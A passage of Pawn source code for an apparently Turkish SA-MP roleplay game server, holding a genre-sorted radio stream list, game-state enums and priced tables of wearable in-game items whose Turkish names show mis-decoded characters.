{"RaDioTEENTAAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268068"},
{"Tutku Fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=21994"},
{"Radio Jacaro","http://yp.shoutcast.com/sbin/tunein-station.pls?id=228698"},
{"BeirutNights","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1168254"},

// Jazz (100-109)
{"SMOOTHJAZZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1339789"},
{"Absolutely Smooth Jazz SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=496891"},
{"SwissGroove","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269641"},
{"Dinner Jazz Excursion","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272149"},
{"181.fm The Breeze","http://yp.shoutcast.com/sbin/tunein-station.pls?id=133405"},
{"A1Smooth","http://yp.shoutcast.com/sbin/tunein-station.pls?id=348116"},
{"SmoothLounge","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1339960"},
{"1.FM Bay Smooth Jazz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271416"},
{"CROOZE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269135"},
{"Jazz Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1256018"},

// Latin (110-119)
{"Salsa SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=835183"},
{"La X Estereo 100 Pura Salsa","http://yp.shoutcast.com/sbin/tunein-station.pls?id=96644"},
{"Reggaeton 24/7","http://yp.shoutcast.com/sbin/tunein-station.pls?id=56349"},
{"LATINO FM EN DIRECTO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280049"},
{"Suave 107.3 FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1593716"},
{"LA PACHANGUERA FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2147665"},
{"XHBIO FIESTA MEXICANA","http://yp.shoutcast.com/sbin/tunein-station.pls?id=338824"},
{"Latin.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=381441"},
{"MKM CARAIBE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1818724"},
{"FUSION","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2919730"},

// Metal (120-129)
{"MUSIK.ROCK","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"RockRadio1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1105299"},
{"METAL ONLY","http://yp.shoutcast.com/sbin/tunein-station.pls?id=477309"},
{"RockRadio1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1105299"},
{"ChroniX GRIT Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2187022"},
{"MUSIK.METAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=141469"},
{"Hard Rock Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=625229"},
{"Death.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2885733"},
{"Big R Radio 80s Metal FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=278974"},
{"1.FM High Voltage","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272098"},

// Misc (130-139)
{"TOP100","http://yp.shoutcast.com/sbin/tunein-station.pls?id=239589"},
{"TOP 100 ReaLCasT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=242423"},
{"NeoFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=548973"},
{"radioparty.pl","http://yp.shoutcast.com/sbin/tunein-station.pls?id=97678"},
{"Desetka Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377246"},
{"Adom 106.3FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=292951"},
{"Joy FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3730"},
{"RADIO INFERNO MANELE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=293251"},
{"Narodni radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=31307"},
{"RaDYO DoGu MiX","http://yp.shoutcast.com/sbin/tunein-station.pls?id=245201"},

// New Age (140-149)
{"Nirvana Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272871"},
{"Radio Art","http://yp.shoutcast.com/sbin/tunein-station.pls?id=411208"},
{"Trancemission.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272865"},
{"Pianorama","http://yp.shoutcast.com/sbin/tunein-station.pls?id=27717"},
{"RADIO GAIA","http://yp.shoutcast.com/sbin/tunein-station.pls?id=187880"},
{"M2 CHILLOUT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279147"},
{"Underground Eighties","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377340"},
{"Digital Relax","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1254140"},
{"meditation.fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2269332"},
{"1.FM Flashback Alternatives","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268764"},

// Pop (150-159)
{"181.FM - POWER 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283896"},
{"Radio Paloma","http://yp.shoutcast.com/sbin/tunein-station.pls?id=710507"},
{"MUSIK.MAIN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275878"},
{".977 The Hitz Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280356"},
{"Lux FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=967434"},
{"Radio VHR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=117838"},
{"Radio Paloma","http://yp.shoutcast.com/sbin/tunein-station.pls?id=710507"},
{"ChartHits.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=43280"},
{"Top Hits Music SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=728272"},
{"Pop Radio One","http://yp.shoutcast.com/sbin/tunein-station.pls?id=128879"},

// Public Radio (160-169)
{"WUNC FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271964"},
{"KPBS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=632915"},
{"89.7 WUWM HD","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1278952"},
{"WHRO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1544465"},
{"KCRW ECLECTIC24","http://yp.shoutcast.com/sbin/tunein-station.pls?id=56697"},
{"SomaFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377771"},
{"WKCR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2100812"},
{"Rete Sport","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3090344"},
{"North Country Public Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=857520"},
{"RIPR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=232368"},

// R&B/Urban (170-179)
{"DEFJAY.DE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=65456"},
{"Amped FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=178297"},
{"HIT104","http://yp.shoutcast.com/sbin/tunein-station.pls?id=663859"},
{"BreakZ.us","http://yp.shoutcast.com/sbin/tunein-station.pls?id=127014"},
{"181.fm True R&B","http://yp.shoutcast.com/sbin/tunein-station.pls?id=83968"},
{"1POWER","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283516"},
{"BlackBeats.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1543115"},
{"Lenz Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273477"},
{"DEFJAY.xyz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=616366"},
{"Spin 1038","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1328653"},

// Rap (180-189)
{"HOT 108 JAMZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1281016"},
{"MUSIK.JAM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269742"},
{"181.FM The BEAT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=166078"},
{"Smoothbeats","http://yp.shoutcast.com/sbin/tunein-station.pls?id=9054"},
{"108.FM THE HITLIST","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1282490"},
{"TrueHipHop","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3083251"},
{"A1Jamz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=49567"},
{"True Beats","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1267461"},
{"MKM URBAN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1818926"},
{"G'D UP RADIO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1504548"},

// Reggae (190-199)
{"Roots Reggae SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=695657"},
{"La Grosse Radio Reggae","http://yp.shoutcast.com/sbin/tunein-station.pls?id=5661"},
{"BigUpRadio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269793"},
{"Raggakings","http://yp.shoutcast.com/sbin/tunein-station.pls?id=123431"},
{"PONdENDS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=221874"},
{"Reggae141","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280855"},
{"Reggae Radio Rasta","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1266989"},
{"1.FM ReggaeTrade","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272779"},
{"Raggakings","http://yp.shoutcast.com/sbin/tunein-station.pls?id=123431"},
{"Black Roots Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=231554"},

// Rock (200-209)
{"181.FM - The Buzz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37586"},
{"NOISEfm.pl","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3121111"},
{"Radio Paradise","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1354805"},
{"MUSIK.ROCK","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"181.FM Good Time Oldies","http://yp.shoutcast.com/sbin/tunein-station.pls?id=25287"},
{"181.fm Rock 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=302754"},
{"ROCKY FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=684390"},
{"ChroniX Aggression","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377260"},
{"Rockenfolie","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2865"},
{"80s SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=737152"},

// Talk (210-219)
{"I GOT BITCHES","http://k003.kiwi6.com/hotlink/d7tvi2aecm/A2M_-_I_Got_Bitches_Lyric_Video_FIXED_.mp3"},
{"AM 1710 Antioch","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2699"},
{"89.3 KPCC","http://yp.shoutcast.com/sbin/tunein-station.pls?id=179361"},
{"The Very Best Of Art Bell","http://yp.shoutcast.com/sbin/tunein-station.pls?id=47835"},
{"KCRW ALL NEWS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279013"},
{"2GB Sydney Talk","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1346749"},
{"Broadband Comedy Network","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3095781"},
{"181.FM Comedy Club","http://yp.shoutcast.com/sbin/tunein-station.pls?id=52807"},
{"Social Crime Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=179709"},
{"Radio Carlin","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1495362"}
};

enum pCrime
{
	pBplayer[32],
	pAccusing[32],
	pAccusedof[32],
	pVictim[32],
};
new PlayerCrime[MAX_PLAYERS][pCrime];
new OyuncuKopegi[MAX_PLAYERS];


enum EventInfoEnum
{
	EventAdvisor,
	EventStatus,
	EventType,
	EventJT[128],
	Float: EventHealth,
	Float: EventArmor,
	Float: EventPositionX,
	Float: EventPositionY,
	Float: EventPositionZ,
	EventInterior,
	EventWorld,
	EventWeapons[5],
	EventTeamColor[2],
    EventTeamSkin[2],
    EventLimit,
    EventTime,
	EventFootRace,
    EventPlayers,
    EventRequest,
    EventStartRequest,
    EventCreator,
    EventStaff[5],
    EventJoinStaff,
    VipOnly,
    Float: EventTeamPosX1,
    Float: EventTeamPosY1,
    Float: EventTeamPosZ1,
    Float: EventTeamPosX2,
    Float: EventTeamPosY2,
    Float: EventTeamPosZ2,
    EventFaction,
    EventFamily,
    EventToggleHeal,
	EventToggleAnims
}
new EventInfo[EventInfoEnum];

enum reportinfo
{
	HasBeenUsed,
	Report[128],
	ReportFrom,
	CheckingReport,
 	TimeToExpire,
	BeingUsed,
	ReportExpireTimer,
	ReplyTimerr,
	BugReport
}

new Reports[MAX_REPORTS][reportinfo];
new ListItemReportId[MAX_PLAYERS][40];
new CancelReport[MAX_PLAYERS];

enum Spikes
{
	Float:sX,
	Float:sY,
	Float:sZ,
	sObjectID,
	sDeployedBy[MAX_PLAYER_NAME],
	sDeployedAt[MAX_ZONE_NAME]
}
new SpikeStrips[10][Spikes];

enum fInfo
{
	FamilyTaken,
	FamilyName[42],
	FamilyMOTD[65],
	FamilyColor,
	FamilyTurfTokens,
	FamilyLeader[MAX_PLAYER_NAME],
	FamilyMembers,
	Float:FamilySpawn[4],
	FamilyInterior,
	FamilyCash,
	FamilyBank,
	FamilyMats,
	FamilyPot,
	FamilyCrack,
	Float:FamilySafe[3],
	FamilyUSafe,
	FamilyRank1[20],
	FamilyRank2[20],
	FamilyRank3[20],
	FamilyRank4[20],
	FamilyRank5[20],
	FamilyRank6[20],
	FamilyPickup,
	FamilyMaxSkins,
	FamilySkins[8],
	Float: FamilyEntrance[4],
	Float: FamilyExit[4],
	FamilyEntrancePickup,
	FamilyExitPickup,
	Text3D:FamilyEntranceText,
	Text3D:FamilyExitText,
	FamilyCustomMap,
	FamilyVirtualWorld,
	FamilyResetSpawns,
	FamilyGuns[10],
};
new FamilyInfo[MAX_FAMILY][fInfo];

enum gateInfo
{
	gGate,
	Text3D:gText,
	gModel,
	Float:gCX,
	Float:gCY,
	Float:gCZ,
	Float:gCRX,
	Float:gCRY,
	Float:gCRZ,
	Float:gOX,
	Float:gOY,
	Float:gOZ,
	Float:gORX,
	Float:gORY,
	Float:gORZ,
	gPassword[256],
	Float:gSpeed,
	gStatus
}
new GateInfo[MAX_GATES][gateInfo];

enum cdInfo
{
	cdOwned,
	cdOwner[MAX_PLAYER_NAME],
	Float: cdEntranceX,
	Float: cdEntranceY,
	Float: cdEntranceZ,
	Float: cdExitX,
	Float: cdExitY,
	Float: cdExitZ,
	cdMessage[128],
	cdTill,
	cdInterior,
	Float: cdVehicleSpawn[4],
	Float: cdRadius,
	cdPrice,
	Float: cdVehicleSpawnX[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnY[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnZ[MAX_DEALERSHIPVEHICLES],
	Float: cdVehicleSpawnAngle[MAX_DEALERSHIPVEHICLES],
	cdVehicleModel[MAX_DEALERSHIPVEHICLES],
	cdVehicleCost[MAX_DEALERSHIPVEHICLES],
	cdVehicleId[MAX_DEALERSHIPVEHICLES], // non-saved
	cdPickupID, // non-saved
	Text3D:cdTextLabel, // non-saved
	Text3D:cdVehicleLabel[MAX_DEALERSHIPVEHICLES], // non-saved
	cdDonator,
};
new CarDealershipInfo[MAX_CARDEALERSHIPS][cdInfo];

enum fvInfo
{
    fvId,
	fvModelId,
	Float: fvSpawnx,
	Float: fvSpawny,
	Float: fvSpawnz,
	Float: fvSpawna,
	Float: fvSpawnxtmp,
	Float: fvSpawnytmp,
	Float: fvSpawnztmp,
	Float: fvSpawnatmp,
	fvLock,
	fvLocked,
	fvPaintJob,
	fvColor1,
	fvColor2,
	fvMods[MAX_MODS],
	fvPrice,
	fvImpounded,
	Float:fvFuel
};

new FamilyVehicleInfo[MAX_FAMILY][MAX_GANG_VEHICLES][fvInfo];

enum objInfo
{
	obj,
	Text3D:oText,
	oModel,
	Float:oX,
	Float:oY,
	Float:oZ,
	Float:oRX,
	Float:oRY,
	Float:oRZ,
}
new ObjInfo[MAX_OBJ][objInfo];

enum fPoint
{
	Float:Pointx,
	Float:Pointy,
	Float:Pointz,
	Type,
	Vulnerable,
	MatPoint,
	CratePoint,
	Announced,
	ClaimerId,
	ClaimerTeam,
	TimeToClaim,
	TimeLeft,
	Owner[32],
	PlayerNameCapping[MAX_PLAYER_NAME],
	CapperName[MAX_PLAYER_NAME],
	Name[32],
	TakeOverTimerStarted,
	TakeOverTimer,
	Text3D:TextLabel,
	CaptureTimerEx2,
	Stock,
	//Text3D:CaptureProccess,
	Text3D:CaptureProgress,
	CaptureProccessEx,
	Float: Capturex,
	Float: Capturey,
	Float: Capturez,
	PointPickupID,
	Bar:PointBarID,
}
new Points[MAX_POINTS][fPoint];

enum pFishing
{
	pFish1[20],
	pFish2[20],
	pFish3[20],
	pFish4[20],
	pFish5[20],
	pWeight1,
	pWeight2,
	pWeight3,
	pWeight4,
	pWeight5,
	pFid1,
	pFid2,
	pFid3,
	pFid4,
	pFid5,
	pLastFish,
	pFishID,
	pLastWeight,
};
new Fishes[MAX_PLAYERS][pFishing];

enum hNews
{
	hTaken1,
	hTaken2,
	hTaken3,
	hTaken4,
	hTaken5,
	hTaken6,
	hTaken7,
	hTaken8,
	hTaken9,
	hTaken10,
	hTaken11,
	hTaken12,
	hTaken13,
	hTaken14,
	hTaken15,
	hTaken16,
	hTaken17,
	hTaken18,
	hTaken19,
	hTaken20,
	hTaken21,
	hAdd1[64],
	hAdd2[64],
	hAdd3[64],
	hAdd4[64],
	hAdd5[64],
	hAdd6[64],
	hAdd7[64],
	hAdd8[64],
	hAdd9[64],
	hAdd10[64],
	hAdd11[64],
	hAdd12[64],
	hAdd13[64],
	hAdd14[64],
	hAdd15[64],
	hAdd16[64],
	hAdd17[64],
	hAdd18[64],
	hAdd19[64],
	hAdd20[64],
	hAdd21[64],
	hContact1[64],
	hContact2[64],
	hContact3[64],
	hContact4[64],
	hContact5[64],
	hContact6[64],
	hContact7[64],
	hContact8[64],
	hContact9[64],
	hContact10[64],
	hContact11[64],
	hContact12[64],
	hContact13[64],
	hContact14[64],
	hContact15[64],
	hContact16[64],
	hContact17[64],
	hContact18[64],
	hContact19[64],
	hContact20[64],
	hContact21[64],
};
new News[hNews];

enum HoldingEnumAll
{
	holdingmodelid,
	holdingprice,
	holdingmodelname[24]
}

new HoldingObjectsCop[14][HoldingEnumAll] = {
{18642,100,"Taser1"},
{19141,250,"SWAT Kaský1"},
{19142,250,"SWAT Zýrhý1"},
{18636,100,"Polis Kepi1"},
{19099,100,"Polis Kepi2"},
{19100,100,"Polis Kepi3"},
{18637,100,"Polis Kalkaný1"},
{19161,100,"Polis Þapkasý1"},
{19162,100,"Polis Þapkasý2"},
{19200,100,"Polis Kaský1"},
{19138,100,"Polis Gözlüðü1"},
{19139,100,"Polis Gözlüðü2"},
{19140,100,"Polis Gözlüðü3"},
{19347,250,"Rozet"}
};

new HoldingObjectsAll[240][HoldingEnumAll] = {
{18642,100,"Taser1"},
{18643,1000,"Lazer Ýþaretleyicisi1"},
{19080,1000,"Lazer Ýþaretleyicisi2"},
{19081,1000,"Lazer Ýþaretleyicisi3"},
{19082,1000,"Lazer Ýþaretleyicisi4"},
{19083,1000,"Lazer Ýþaretleyicisi5"},
{19084,1000,"Lazer Ýþaretleyicisi6"},
{19086,500,"Dildo1"},
{18675,1000,"Puf Duman"},
{19701,1000,"Küçük Alev"},
{18693,1000,"Büyük Alev"},
{18698,1000,"Böcekler"},
{18708,1000,"Baloncuklar"},
{19141,250,"SWAT Kaský1"},
{19142,250,"SWAT Zýrhý1"},
{18636,100,"Polis Kepi1"},
{19099,100,"Polis Kepi2"},
{19100,100,"Polis Kepi3"},
{18637,100,"Polis Kalkaný1"},
{19161,100,"Polis Þapkasý1"},
{19162,100,"Polis Þapkasý2"},
{19200,100,"Polis Kaský1"},
{19138,100,"Polis Gözlüðü1"},
{19139,100,"Polis Gözlüðü2"},
{19140,100,"Polis Gözlüðü3"},
{19347,250,"Rozet"},
{18632,100,"Olta"},
{18633,150,"Ingiliz Anahtarý"},
{18634,100,"Levye"},
{18635,100,"Çekiç"},
{18638,50,"Koruyucu Baþlýk"},
{19093,50,"Koruyucu Baþlýk2"},
{19160,50,"Koruyucu Baþlýk3"},
{18639,50,"Siyah Þapka"},
{18640,70,"Saç"},
{18975,70,"Saç2"},
{19136,70,"Saç3"},
{19274,70,"Saç4"},
{18641,100,"Elfeneri"},
{18644,500,"Tornavida"},
{18865,50,"Cep Telefonu1"},
{18866,50,"Cep Telefonu2"},
{18867,50,"Cep Telefonu3"},
{18868,50,"Cep Telefonu4"},
{18869,50,"Cep Telefonu5"},
{18870,100,"Cep Telefonu6"},
{18871,100,"Cep Telefonu7"},
{18872,100,"Cep Telefonu8"},
{18873,100,"Cep Telefonu9"},
{18874,100,"Cep Telefonu10"},
{18875,75,"Çaðrý Cihazý"},
{18890,50,"Tarak"},
{18891,50,"Bandana1"},
{18892,50,"Bandana2"},
{18893,50,"Bandana3"},
{18894,50,"Bandana4"},
{18895,50,"Bandana5"},
{18896,50,"Bandana6"},
{18897,50,"Bandana7"},
{18898,50,"Bandana8"},
{18899,50,"Bandana9"},
{18900,50,"Bandana10"},
{18901,75,"Bandana11"},
{18902,75,"Bandana12"},
{18903,75,"Bandana13"},
{18904,75,"Bandana14"},
{18905,75,"Bandana15"},
{18906,75,"Bandana16"},
{18907,75,"Bandana17"},
{18908,75,"Bandana18"},
{18909,75,"Bandana19"},
{18910,75,"Bandana20"},
{18911,100,"Maske1"},
{18912,100,"Maske2"},
{18913,100,"Maske3"},
{18914,100,"Maske4"},
{18915,100,"Maske5"},
{18916,100,"Maske6"},
{18917,100,"Maske7"},
{18918,100,"Maske8"},
{18919,100,"Maske9"},
{18920,100,"Maske10"},
{18921,50,"Bere1"},
{18922,50,"Bere2"},
{18923,75,"Bere3"},
{18924,100,"Bere4"},
{18925,100,"Bere5"},
{18926,50,"Þapka1"},
{18927,50,"Þapka2"},
{18928,50,"Þapka3"},
{18929,50,"Þapka4"},
{18930,50,"Þapka5"},
{18931,100,"Þapka6"},
{18932,100,"Þapka7"},
{18933,100,"Þapka8"},
{18934,100,"Þapka9"},
{18935,100,"Þapka10"},
{18936,50,"Kask1"},
{18937,75,"Kask2"},
{18938,100,"Kask3"},
{18939,75,"Ters Þapka1"},
{18940,75,"Ters Þapka2"},
{18941,75,"Ters Þapka3"},
{18942,100,"Ters Þapka4"},
{18943,100,"Ters Þapka5"},
{18944,100,"Hasýr Þapka1"},
{18945,125,"Hasýr Þapka2"},
{18946,150,"Hasýr Þapka3"},
{18947,100,"Fötr Þapka1"},
{18948,100,"Fötr Þapka2"},
{18949,100,"Fötr Þapka3"},
{18950,100,"Fötr Þapka4"},
{18951,100,"Fötr Þapka5"},
{18952,150,"Boks Kaský"},
{18953,50,"Örme Þapka1"},
{18954,75,"Örme Þapka2"},
{18955,75,"Hippi Þapkasý1"},
{18956,75,"Hippi Þapkasý2"},
{18957,75,"Hippi Þapkasý3"},
{18958,75,"Hippi Þapkasý4"},
{18959,75,"Hippi Þapkasý5"},
{18960,100,"Kep Þapka1"},
{18961,75,"Kamyoncu Þapkasý1"},
{18962,75,"Kovboy Þapkasý2"},
{18964,100,"Kurukafa Bere1"},
{18965,125,"Kurukafa Bere2"},
{18966,150,"Kurukafa Bere3"},
{18967,100,"Erkek Þapkasý1"},
{18968,100,"Erkek Þapkasý2"},
{18969,100,"Erkek Þapkasý3"},
{18970,200,"Kaplan Þapka"},
{18971,100,"Cool Þapka1"},
{18972,125,"Cool Þapka2"},
{18973,150,"Cool Þapka3"},
{18974,1000,"Zorro Maskesi1"},
{18645,150,"Motorcu Kaský"},
{18976,100,"Motorcu Kaský2"},
{18977,100,"Motorcu Kaský3"},
{18978,125,"Motorcu Kaský4"},
{18979,150,"Motorcu Kaský5"},
{19006,50,"Gözlük1"},
{19007,50,"Gözlük2"},
{19008,50,"Gözlük3"},
{19009,50,"Gözlük4"},
{19010,50,"Gözlük5"},
{19011,50,"Gözlük6"},
{19012,50,"Gözlük7"},
{19013,50,"Gözlük8"},
{19014,50,"Gözlük9"},
{19015,50,"Gözlük10"},
{19016,100,"Gözlük11"},
{19017,100,"Gözlük12"},
{19018,100,"Gözlük13"},
{19019,100,"Gözlük14"},
{19020,100,"Gözlük15"},
{19021,100,"Gözlük16"},
{19022,100,"Gözlük17"},
{19023,100,"Gözlük18"},
{19024,100,"Gözlük19"},
{19025,100,"Gözlük20"},
{19026,150,"Gözlük21"},
{19027,150,"Gözlük22"},
{19028,150,"Gözlük23"},
{19029,150,"Gözlük24"},
{19030,150,"Gözlük25"},
{19031,150,"Gözlük26"},
{19032,150,"Gözlük27"},
{19033,150,"Gözlük28"},
{19034,150,"Gözlük29"},
{19035,150,"Gözlük30"},
{19036,200,"Hokey Maskesi1"},
{19037,200,"Hokey Maskesi2"},
{19038,200,"Hokey Maskesi3"},
{19039,50,"Saat1"},
{19040,50,"Saat2"},
{19041,50,"Saat3"},
{19042,50,"Saat4"},
{19043,50,"Saat5"},
{19044,50,"Saat6"},
{19045,50,"Saat7"},
{19046,100,"Saat8"},
{19047,100,"Saat9"},
{19048,100,"Saat10"},
{19049,100,"Saat11"},
{19050,100,"Saat12"},
{19051,100,"Saat13"},
{19052,100,"Saat14"},
{19053,100,"Saat15"},
{19064,1000, "Noel Þapkasý1"},
{19065,2000, "Noel Þapkasý2"},
{19066,300, "Noel Þapkasý3"},
{19067,100, "Kapþon1"},
{19068,100, "Kapþon2"},
{19069,100, "Kapþon3"},
{19078,750, "Papaðan1"},
{19079,750, "Papaðan2"},
{19085,500, "Korsan Bandý"},
{19090,150, "Mavi Ponpon"},
{19091,150, "Kýrmýzý Ponpon"},
{19092,150, "Yeþil Ponpon"},
{19094,200, "Hamburger Þapkasý"},
{19095,50, "Kovboy Þapkasý1"},
{19096,50, "Kovboy Þapkasý3"},
{19097,100, "Kovboy Þapkasý4"},
{19098,100, "Kovboy Þapkasý5"},
{19101,200, "Ordu Kaský1"},
{19102,200, "Ordu Kaský2"},
{19103,200, "Ordu Kaský3"},
{19104,200, "Ordu Kaský4"},
{19105,200, "Ordu Kaský5"},
{19106,200, "Ordu Kaský6"},
{19107,400, "Ordu Kaský7"},
{19108,400, "Ordu Kaský8"},
{19109,400, "Ordu Kaský9"},
{19110,400, "Ordu Kaský10"},
{19111,400, "Ordu Kaský11"},
{19112,400, "Ordu Kaský12"},
{19113,100, "Komik Kask1"},
{19114,200, "Komik Kask2"},
{19115,300, "Komik Kask3"},
{19116,50, "Düz Kask1"},
{19117,50, "Düz Kask2"},
{19118,75, "Düz Kask3"},
{19119,100, "Düz Kask4"},
{19120,100, "Düz Kask5"},
{19137,500, "Tavukçu Þapkasý"},
{19163,100, "Siyah Maske"},
{1210,50, "Evrak Çantasý"},
{19421,50, "Kulaklýk1"},
{19422,50, "Kulaklýk2"},
{19423,50, "Kulaklýk3"},
{19424,50, "Kulaklýk4"},
{19350,50, "Býyýk1"},
{19351,50, "Býyýk2"},
{19352,50, "Fötr"},
{19349,50, "Tekli Gözlük"},
{19317,50, "Bass gitar"},
{371,500, "Backpack"},
{3044,500, "Sigara"},
{3027,500, "Sarma Sigara"}
};

enum HoldingEnum
{
	holdingmodelid,
	holdingprice,
	holdingmodelname[24]
}

new HoldingObjects[220][HoldingEnum] = {
{18643,150000,"Lazer Ýþaretleyicisi1"},
{19080,150000,"Lazer Ýþaretleyicisi2"},
{19081,150000,"Lazer Ýþaretleyicisi3"},
{19082,150000,"Lazer Ýþaretleyicisi4"},
{19083,150000,"Lazer Ýþaretleyicisi5"},
{19084,150000,"Lazer Ýþaretleyicisi6"},
{18632,100,"Olta"},
{18633,150,"Ingiliz Anahtarý"},
{18634,100,"Levye"},
{18635,100,"Çekiç"},
{18638,50,"Koruyucu Kask"},
{19093,50,"Koruyucu Kask2"},
{19160,50,"Koruyucu Kask3"},
{18639,50,"Siyah Þapka"},
{18640,70,"Saç"},
{18975,70,"Saç2"},
{19136,70,"Saç3"},
{19274,70,"Saç4"},
{18641,100,"Elfeneri"},
{18644,500,"Tornavida"},
{18865,50,"Cep Telefonu1"},
{18866,50,"Cep Telefonu2"},
{18867,50,"Cep Telefonu3"},
{18868,50,"Cep Telefonu4"},
{18869,50,"Cep Telefonu5"},
{18870,100,"Cep Telefonu6"},
{18871,100,"Cep Telefonu7"},
{18872,100,"Cep Telefonu8"},
{18873,100,"Cep Telefonu9"},
{18874,100,"Cep Telefonu10"},
{18875,75,"Çaðrý Cihazý"},
{18890,50,"Tarak"},
{18891,50,"Bandana1"},
{18892,50,"Bandana2"},
{18893,50,"Bandana3"},
{18894,50,"Bandana4"},
{18895,50,"Bandana5"},
{18896,50,"Bandana6"},
{18897,50,"Bandana7"},
{18898,50,"Bandana8"},
{18899,50,"Bandana9"},
{18900,50,"Bandana10"},
{18901,75,"Bandana11"},
{18902,75,"Bandana12"},
{18903,75,"Bandana13"},
{18904,75,"Bandana14"},
{18905,75,"Bandana15"},
{18906,75,"Bandana16"},
{18907,75,"Bandana17"},
{18908,75,"Bandana18"},
{18909,75,"Bandana19"},
{18910,75,"Bandana20"},
{18911,100,"Maske1"},
{18912,100,"Maske2"},
{18913,100,"Maske3"},
{18914,100,"Maske4"},
{18915,100,"Maske5"},
{18916,100,"Maske6"},
{18917,100,"Maske7"},
{18918,100,"Maske8"},
{18919,100,"Maske9"},
{18920,100,"Maske10"},
{18921,50,"Bere1"},
{18922,50,"Bere2"},
{18923,75,"Bere3"},
{18924,100,"Bere4"},
{18925,100,"Bere5"},
{18926,50,"Þapka1"},
{18927,50,"Þapka2"},
{18928,50,"Þapka3"},
{18929,50,"Þapka4"},
{18930,50,"Þapka5"},
{18931,100,"Þapka6"},
